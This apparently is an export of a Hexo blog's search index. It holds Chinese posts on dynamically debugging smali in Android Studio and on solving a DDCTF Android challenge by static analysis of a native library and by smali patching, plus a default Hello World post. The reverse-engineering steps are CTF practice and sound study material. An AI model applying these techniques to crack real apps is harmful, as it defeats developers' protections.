    <content><![CDATA[<p>首发：<a href="http://kongdewei.cn/2017/07/03/Android-Studio%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95Smail/" target="_blank" rel="external">Android Studio动态调试Smail</a></p>
<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p><a href="http://kongdewei.cn/2017/06/30/DDCTF%E5%AE%89%E5%8D%93%E9%A2%98-writeup/" target="_blank" rel="external">DDCTF安卓题调试</a><br>上一次是静态修改，后来我在想能不能动态调试得到Flag，于是就有了这篇文章。</p>
<blockquote>
<p>apk下载地址<br><a href="http://download.csdn.net/detail/dad9988/9887419" target="_blank" rel="external">http://download.csdn.net/detail/dad9988/9887419</a></p>
</blockquote>
<a id="more"></a>
<h1 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h1><h2 id="下载、安装android-studio"><a href="#下载、安装android-studio" class="headerlink" title="下载、安装android studio"></a>下载、安装android studio</h2><blockquote>
<p><a href="https://dl.google.com/dl/android/studio/install/2.3.2.0/android-studio-bundle-162.3934792-windows.exe" target="_blank" rel="external">https://dl.google.com/dl/android/studio/install/2.3.2.0/android-studio-bundle-162.3934792-windows.exe</a></p>
</blockquote>
<p>非常神奇，可以不翻(河蟹)墙下载,看来G(河蟹)F(河蟹)W对程序员还是很友善的。<br>android studio集成了所需要的东西，以前eclipse需要另外装各种东西方便很多。</p>
<p><img src="/images/jt/6671501-0ff9957faf920f69.png" alt="IDM下载中..."></p>
<p><img src="/images/jt/6671501-1b330e974557138a.png" alt="next"></p>
<p><img src="/images/jt/6671501-4b74a8c3d2b850f2.png" alt="如果C盘空间不够可以修改下盘符"></p>
<p><img src="/images/jt/6671501-0ffa98fe15afbbb0.png" alt="Setup Load..."></p>
<p><img src="/images/jt/6671501-09ebd5a4860ef4dd.png" alt="sdk包安装"></p>
<h2 id="下载、安装模拟器"><a href="#下载、安装模拟器" class="headerlink" title="下载、安装模拟器"></a>下载、安装模拟器</h2><blockquote>
<p> 推荐使用这款模拟器<br><a href="https://www.yeshen.com/" target="_blank" rel="external">https://www.yeshen.com/</a></p>
</blockquote>
<p>模拟器安装就不赘述了。</p>
<h2 id="改之理"><a href="#改之理" class="headerlink" title="改之理"></a>改之理</h2><p>很多apk解包使用apktools.jar会出现各种问题，直接用ide会方便很多。</p>
<blockquote>
<p>下载地址：<br> <a href="http://www.52pojie.cn/thread-399571-1-1.html" target="_blank" rel="external">http://www.52pojie.cn/thread-399571-1-1.html</a></p>
</blockquote>
<h1 id="0x02-实战操作"><a href="#0x02-实战操作" class="headerlink" title="0x02 实战操作"></a>0x02 实战操作</h1><h2 id="解包与导入工程到Android-Studio"><a href="#解包与导入工程到Android-Studio" class="headerlink" title="解包与导入工程到Android Studio"></a>解包与导入工程到Android Studio</h2><p>首先使用apk改之理解包，直接用改之理打开apk包即可，改之理目录下就会有解包后的文件。<br><img src="/images/jt/6671501-9d6eae63eac2fdda.png" alt=""></p>
<p>work目录下是解包后的文件<br><img src="/images/jt/6671501-9421f700c00b79cb.png" alt=""></p>
<p>打开Android Studio选Import project<br><img src="/images/jt/6671501-a2021403a52a1e8e.png" alt=""></p>
<p>选择刚才的解包目录<br><img src="/images/jt/6671501-a3d2fc495f199a35.png" alt=""></p>
<p>直接next到底<br><img src="/images/jt/6671501-e39da56d7e66038d.png" alt=""></p>
<p><img src="/images/jt/6671501-ce072ea9d6f6cf07.png" alt=""></p>
<p>导入后会有一段时间的加载文件。<br><img src="/images/jt/6671501-83cbdb690d570c87.png" alt=""></p>
<h2 id="安装smalidea"><a href="#安装smalidea" class="headerlink" title="安装smalidea"></a>安装smalidea</h2><p>File—&gt;Settings—&gt;Install plugin from disk<br><img src="/images/jt/6671501-a0e92fc66131213e.png" alt=""></p>
<blockquote>
<p>下载smalidea-0.05.zip(这一步只需要做一次)<br><a href="https://bitbucket.org/JesusFreke/smali/downloads/" target="_blank" rel="external">https://bitbucket.org/JesusFreke/smali/downloads/</a></p>
</blockquote>
<p>选择刚下载的smalidea-0.05.zip<br><img src="/images/jt/6671501-35fde0adcdf1314c.png" alt=""></p>
<p>导入需要重启一下。<br><img src="/images/jt/6671501-39ed20c0bd810ace.png" alt=""></p>
<h2 id="寻找命令行启动参数"><a href="#寻找命令行启动参数" class="headerlink" title="寻找命令行启动参数"></a>寻找命令行启动参数</h2><p>改之理解包目录下打开AndroidManifest.xml,记录activity层的android:name值。<br><img src="/images/jt/6671501-970dcf1884ae77da.png" alt=""></p>
<h2 id="adb-shell启动apk"><a href="#adb-shell启动apk" class="headerlink" title="adb shell启动apk"></a>adb shell启动apk</h2><p>运行模拟器，在Android Studio中启动android device monitor<br><img src="/images/jt/6671501-06eb42c39e71bc55.png" alt=""></p>
<p>一般会自动链接到ADM中，如果没有自动链接上去使用以下命令进行链接。</p>
<blockquote>
<p>我推荐的这个模拟器是链接62001其他模拟器自查<br>adb connect 127.0.0.1:62001</p>
</blockquote>
<p><img src="/images/jt/6671501-e200faeb86605d67.png" alt=""></p>
<p>安装apk到模拟器（apk直接拉进去就自动安装了），并使用命令启动apk（adb如果未找到命令，请百度如何解决。）</p>
<blockquote>
<p>adb shell am start -D -n com.didictf.hellolibs/com.didictf.hellolibs.MainActivity  </p>
</blockquote>
<p>运行命令后可通过adm看到有个红色的虫子图标，这个时候apk已经挂起等待调试了。<br><img src="/images/jt/6671501-963bfb9e628a5101.png" alt=""></p>
<p>在MainActivity下的OnCreate函数下断点</p>
<p><img src="/images/jt/6671501-cf257366c18855c5.png" alt=""></p>
<p>点击如图的三角，选择Edit Configurations<br><img src="/images/jt/6671501-72ed6d4addc5086f.png" alt=""></p>
<p>点击加号，选择Remote<br><img src="/images/jt/6671501-6b53281823c9737b.png" alt=""></p>
<p>修改port为8700点击OK<br><img src="/images/jt/6671501-e214767c2a03d0a4.png" alt=""></p>
<p>点击调试按钮挂载到模拟器中</p>
<p><img src="/images/jt/6671501-cc40db725d7f6db4.png" alt=""></p>
<p>已经断在我们下的断点。</p>
<p><img src="/images/jt/6671501-d2556f41ea49bfa1.png" alt=""></p>
<h1 id="0x03-调试"><a href="#0x03-调试" class="headerlink" title="0x03 调试"></a>0x03 调试</h1><p><a href="http://kongdewei.cn/2017/06/30/DDCTF%E5%AE%89%E5%8D%93%E9%A2%98-writeup/" target="_blank" rel="external">DDCTF安卓题调试</a></p>
<p>上一篇文章分析得出关键位置在MainActivity中的onClickTest函数，这次我们直接在这里下断点，动态调试。</p>
<p><img src="/images/jt/6671501-a32409efe54d3df4.png" alt=""></p>
<p>模拟器随便输入，点击test按钮，就会断在我们下的地方</p>
<p><img src="/images/jt/6671501-fe7bf17666b38866.png" alt="Paste_Image.png"></p>
<p>点击如图加号添加v0 ,v1,p0监视变量，并F8单步向下，走到58行，就会从so中返回flag到系统apk的v1变量中。<br><img src="/images/jt/6671501-580febd80d059429.png" alt=""></p>
<p>对比下反编译的源码，更容易分析apk的工作流程。<br><img src="/images/jt/6671501-c2317bf131ebf003.png" alt=""></p>
<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>对于这个CTF的apk，动态调试会更加直观，下好断点，添加监视变量直接但步向下即可，比静态修改重新打包来的方便。</p>
<p>转载请注明出处。</p>
]]></content>
      <categories>
        <category>移动安全android</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>DDCTF安卓题-writeup</title>
    <url>/2017/06/30/DDCTF%E5%AE%89%E5%8D%93%E9%A2%98-writeup/</url>
    <content><![CDATA[<h1 id="0x01-引子"><a href="#0x01-引子" class="headerlink" title="0x01 引子"></a>0x01 引子</h1><p>前段做了一个滴滴CTF的其中一道安卓题目，题目并不难，主要分享一下做题过程和思路。</p>
<p><img src="/images/jt/6671501-b5da14d5cee7f2d3.png" alt="题目包"><br><a id="more"></a></p>
<h1 id="0x02-要求与提示"><a href="#0x02-要求与提示" class="headerlink" title="0x02 要求与提示"></a>0x02 要求与提示</h1><p>赛题背景：本挑战结合了Android, Java, C/C++，加密算法等知识点，考察了挑战者的binary逆向技术和加密算法能力。</p>
<p>赛题描述：本题是一个app，请试分析app中隐藏的key，逆向加密算法并得到对应的秘钥。可以在app中尝试输入key，如果正确会显示“correct”，如果错误会显示“Wrong”。<br>提   示：阅读assembly code，理解xor的加密逻辑和参数，解出答案。<br>评分标准：key正确则可进入下一题。</p>
<p>Flag格式为DDCTF-XXXXXXXXXXXX@didichuxing.com</p>
<p>还是很好辨认的<img src="/images/jt/6671501-ba050aa48e79dbb0.png" alt=""></p>
<h1 id="0x03-分析与过程"><a href="#0x03-分析与过程" class="headerlink" title="0x03 分析与过程"></a>0x03 分析与过程</h1><p><img src="/images/jt/6671501-6d5497f007ffebc1.png" alt="运行app后"></p>
<p>直接点击下方的TEST按钮显示Wrong<br>上apkkiller<br>找到关键位置，进行关键词搜索（搜Wrong）。</p>
<p><img src="/images/jt/6671501-c084c150baf021d3.png" alt="appkiller找到关键位置"></p>
<p>反编译源码（appkiller上点击java图标）</p>
<p><img src="/images/jt/6671501-95060fbf26f78c84.png" alt="关键位置源码"></p>
<p>这里直接贴上来代码<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span></span></div><div class="line">  <span class="keyword">extends</span> <span class="title">AppCompatActivity</span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">private</span> TextView mFlagEntryView;</div><div class="line">  <span class="keyword">private</span> TextView mFlagResultView;</div><div class="line">  </div><div class="line">  <span class="keyword">static</span></div><div class="line">  &#123;</div><div class="line">    System.loadLibrary(<span class="string">"hello-libs"</span>);</div><div class="line">  &#125;</div><div class="line">  </div><div class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClickTest</span><span class="params">(View paramView)</span></span></div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.mFlagEntryView.getText().toString().equals(stringFromJNI())) &#123;</div><div class="line">      <span class="keyword">this</span>.mFlagResultView.setText(<span class="string">"Correct"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (;;)</div><div class="line">    &#123;</div><div class="line">      <span class="keyword">return</span>;</div><div class="line">      <span class="keyword">this</span>.mFlagResultView.setText(<span class="string">"Wrong"</span>);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  </div><div class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle paramBundle)</span></span></div><div class="line">  &#123;</div><div class="line">    <span class="keyword">super</span>.onCreate(paramBundle);</div><div class="line">    setContentView(<span class="number">2130968602</span>);</div><div class="line">    <span class="keyword">this</span>.mFlagEntryView = ((TextView)findViewById(<span class="number">2131427413</span>));</div><div class="line">    <span class="keyword">this</span>.mFlagResultView = ((TextView)findViewById(<span class="number">2131427415</span>));</div><div class="line">  &#125;</div><div class="line">  </div><div class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title">stringFromJNI</span><span class="params">()</span></span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>其中onClickTest响应TEST按钮点击 </p>
<blockquote>
<p>this.mFlagEntryView.getText().toString().equals(stringFromJNI())</p>
</blockquote>
<p>从mFlagEntryView得到view控件内容，tostring转string型，使用equals对比stringFromJNI()返回值。</p>
<p>一般我们应该跟踪stringFromJNI()函数看他返回了什么值，接下来查找该函数的来源</p>
<blockquote>
<p>  static<br>  {<br>    System.loadLibrary(“hello-libs”);<br>  }</p>
</blockquote>
<p>加载了so模块hello-libs</p>
<p><img src="/images/jt/6671501-f40b92aa8b0e886a.png" alt="7zip打开apk"></p>
<p>这个时候分析so文件获取flag就行了。</p>
<p><img src="/images/jt/6671501-8cf3623f282ba066.png" alt="so文件拖入IDA"></p>
<p>这里很简单并没有加什么混淆，直接写在so文件中，到这里就算完成这题。</p>
<h1 id="0x04-另一种思路"><a href="#0x04-另一种思路" class="headerlink" title="0x04 另一种思路"></a>0x04 另一种思路</h1><p>如果这个题目的so中是经过运算加密返回的，并无法直接静态看到flag那该怎么办。</p>
<blockquote>
<p> this.mFlagEntryView.getText().toString().equals(stringFromJNI())</p>
</blockquote>
<p>前面我们分析过这个位置，因为使用equals进行字符串对比。<br>看下equals的java解释</p>
<p><img src="/images/jt/6671501-a8017425e94dc037.png" alt="equals解释"></p>
<p>Equals之前使用了tostring，所以如果mFlagEntryView的内容与stringFromJNI返回值相同才会出现true的情况，那么也就是说stringFromJNI是把flag返回到程序领空的，我们直接修改smil代码把flag显示在mFlagResultView中。</p>
<p><img src="/images/jt/6671501-5e5c61615f55fa02.png" alt="直接修改smail语句实现flag显示在view中"></p>
<p><img src="/images/jt/6671501-7c1bc6151beb3e87.png" alt="直接修改smail语句实现flag显示在view中"></p>
<p>直接获取stringFromJNI返回值然后赋值给mFlagResultView，再安装运行即可。<br><img src="/images/jt/6671501-7f5b6a7367713f74.png" alt="打包运行效果"></p>
]]></content>
      <categories>
        <category>移动安全android</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2016/09/23/hello-world/</url>
    <content><![CDATA[<p>0Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.<br><a id="more"></a></p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
]]></content>
      <categories>
        <category>test</category>
      </categories>
      <tags>
        <tag>你好世界</tag>
      </tags>
  </entry>
</search>
